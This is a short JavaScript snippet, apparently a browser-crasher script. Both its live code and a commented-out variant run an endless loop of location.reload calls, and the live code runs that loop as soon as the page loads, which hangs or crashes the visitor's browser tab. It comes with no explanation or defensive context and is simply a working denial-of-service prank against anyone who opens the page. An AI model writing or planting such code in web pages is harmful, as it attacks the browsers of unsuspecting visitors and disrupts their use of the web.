/*onbeforeunload = function(){};

setTimeout(function(){
  while(true)
    location.reload(1)
}, 1000)*/

onbeforeunload = crash();

function crash() {
  while(true)
    location.reload(1)
}